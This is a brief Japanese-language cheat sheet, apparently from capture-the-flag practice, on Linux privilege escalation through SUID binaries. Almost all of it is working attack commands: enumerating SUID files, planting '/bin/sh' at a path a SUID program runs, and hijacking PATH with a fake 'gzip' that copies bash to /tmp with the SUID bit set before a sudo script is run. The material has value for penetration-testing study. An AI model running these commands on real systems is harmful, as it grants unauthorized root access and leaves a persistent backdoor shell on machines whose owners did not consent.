# SUID

### SUIDに設定されている実行ファイルの列挙
```
find / -perm -u=s -type f 2>/dev/null
```

### 特定のパスにroot権限でbashを起動できるパターン
1.スクリプトを配置
```
printf '/bin/sh' > /tmp/listusers
```
2.実行権限付与
```
chmod a+x /tmp/listusers
```
3.実行
```
/usr/bin/viewuser
```

### 環境変数を修正するパターン
1.都合よく環境変数を追加
```
cd /tmp
```
```
export PATH=/tmp:$PATH
```
2.都合良くコマンドを作成
```
echo -ne '#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod 4755 /tmp/bash' > gzip
```
```
chmod +x gzip
```
3.実行
```
sudo /opt/scripts/access_backup.sh
```
